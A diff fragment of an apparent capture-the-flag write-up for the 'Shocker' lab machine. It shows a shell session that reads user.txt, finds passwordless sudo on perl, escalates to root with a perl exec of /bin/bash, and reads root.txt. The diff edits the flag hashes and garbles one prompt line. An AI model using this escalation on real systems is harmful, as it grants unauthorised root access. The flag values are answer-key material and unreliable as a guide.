@@ -81,6 +81,7 @@ shelly@Shocker:/home$ cd shelly
 cd shelly
 shelly@Shocker:/home/shelly$ cat user.txt
 cat user.txt
+3933f1d40384dd0e77f809d922dee732
 
 shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
 sudo -l
@@ -91,7 +92,7 @@ Matching Defaults entries for shelly on Shocker:
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
     
-shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
+shelly@Shocker:/usr/lib/cgi-bin$c
 sudo /usr/bin/perl -e 'exec "/bin/bash";'
 whoami
 root
@@ -100,5 +101,5 @@ cd /root
 ls
 root.txt
 cat root.txt
-e435766c3a474bc01d29d3a5ac17c3c4
+e409ad0155c5a6d52f5820d85de513a9
 ```
